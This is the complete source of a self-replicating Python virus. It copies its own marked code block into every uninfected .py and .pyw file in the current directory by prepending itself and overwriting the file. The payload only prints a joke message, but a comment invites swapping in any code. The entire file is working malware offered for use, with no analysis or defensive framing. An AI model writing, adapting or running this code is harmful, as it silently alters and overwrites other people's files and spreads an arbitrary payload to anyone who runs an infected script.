#MAL
#a simple self replicating python script
import sys
import glob
#this is where the fun begins
virus_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
self_replicating_part = False
for line in lines:
    if line == "#MAL":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "#WARE\n":
        break
#now the files are located and listed
python_files = glob.glob('*.py') + glob.glob('*.pyw')
for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    infected =False
    for line in file_code:
        if line == "#MAL\n":
            infected = True
            break
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)
        with open(file, 'w') as f:
            f.writelines(final_code)
#this is where the payload is added edit line 37 with whatever code you want
#currently line 37 just prints ALL YOUR PYTHON ARE BELONG TO ME
def malicious_code():
    print("ALL YOUR PYTHON ARE BELONG TO ME")
malicious_code()
#WARE
